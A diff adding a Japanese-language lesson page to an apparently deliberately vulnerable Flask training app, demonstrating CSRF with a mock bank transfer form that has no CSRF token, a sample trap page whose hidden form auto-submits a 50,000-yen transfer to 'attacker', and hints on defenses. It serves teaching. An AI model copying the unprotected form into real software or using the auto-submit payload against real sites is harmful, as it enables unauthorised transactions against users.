@@ -1,0 +1,100 @@
+{% extends "base.html" %}
+{% block title %}CSRF - Vulnerable App{% endblock %}
+{% block content %}
+<h3 class="vuln-header">3. CSRF（クロスサイトリクエストフォージェリ）</h3>
+
+<div class="row mt-3">
+    <div class="col-lg-8">
+        <div class="card mb-3">
+            <div class="card-body">
+                <h5>概要</h5>
+                <p>Webアプリケーションがリクエストの送信元を検証しない場合、攻撃者が用意した罠サイトから
+                   ユーザーの意図しないリクエストを送信させることができます。</p>
+                <span class="badge bg-warning text-dark">OWASP A01:Access Control</span>
+                <span class="badge bg-secondary">IPA: 認可・認証の不備</span>
+            </div>
+        </div>
+
+        <div class="card mb-3">
+            <div class="card-body">
+                <h5>体験: 銀行送金フォーム</h5>
+                <div class="alert alert-info">
+                    現在の残高: <strong>¥{{ "{:,}".format(balance) }}</strong>
+                </div>
+
+                {% if message %}
+                <div class="alert alert-warning">{{ message }}</div>
+                {% endif %}
+
+                <form method="POST">
+                    <div class="mb-3">
+                        <label class="form-label">送金先</label>
+                        <input type="text" name="to" class="form-control" placeholder="送金先の名前">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">金額（円）</label>
+                        <input type="number" name="amount" class="form-control" placeholder="10000">
+                    </div>
+                    <button type="submit" class="btn btn-primary">送金する</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- CSRF攻撃デモ -->
+        <div class="csrf-demo mb-3">
+            <h6>攻撃用HTML（外部サイトに設置されたと仮定）</h6>
+            <p class="small text-muted">以下のHTMLを別のタブで開くと、ユーザーの意図なく送金が実行されます。</p>
+            <pre class="output"><code>&lt;!-- 攻撃者のサイトに設置された罠ページ --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;h1&gt;おめでとうございます！当選しました！&lt;/h1&gt;
+  &lt;form id="csrf" action="http://localhost:5000/vuln/csrf"
+        method="POST" style="display:none"&gt;
+    &lt;input name="to" value="attacker"&gt;
+    &lt;input name="amount" value="50000"&gt;
+  &lt;/form&gt;
+  &lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            <button class="btn btn-danger btn-sm" onclick="
+                var f = document.createElement('form');
+                f.method = 'POST';
+                f.action = '/vuln/csrf';
+                var i1 = document.createElement('input');
+                i1.name = 'to'; i1.value = 'attacker(CSRF攻撃)';
+                var i2 = document.createElement('input');
+                i2.name = 'amount'; i2.value = '50000';
+                f.appendChild(i1); f.appendChild(i2);
+                document.body.appendChild(f); f.submit();
+            ">CSRF攻撃をシミュレート（¥50,000を送金）</button>
+        </div>
+
+        <div class="accordion hint-section" id="hintCSRF">
+            <div class="accordion-item">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#csrf1">
+                        ヒント1: なぜ攻撃が成功するのか
+                    </button>
+                </h2>
+                <div id="csrf1" class="accordion-collapse collapse" data-bs-parent="#hintCSRF">
+                    <div class="accordion-body">送金フォームにCSRFトークンがありません。サーバーはリクエストの送信元を検証していません。</div>
+                </div>
+            </div>
+            <div class="accordion-item">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#csrf2">
+                        ヒント2: 対策方法
+                    </button>
+                </h2>
+                <div id="csrf2" class="accordion-collapse collapse" data-bs-parent="#hintCSRF">
+                    <div class="accordion-body">
+                        フォームにCSRFトークン（hidden input）を含め、サーバー側で検証します。
+                        FlaskではFlask-WTFの <code>CSRFProtect</code> を使うのが一般的です。
+                        また、<code>SameSite=Lax</code> Cookieも有効な対策です。
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
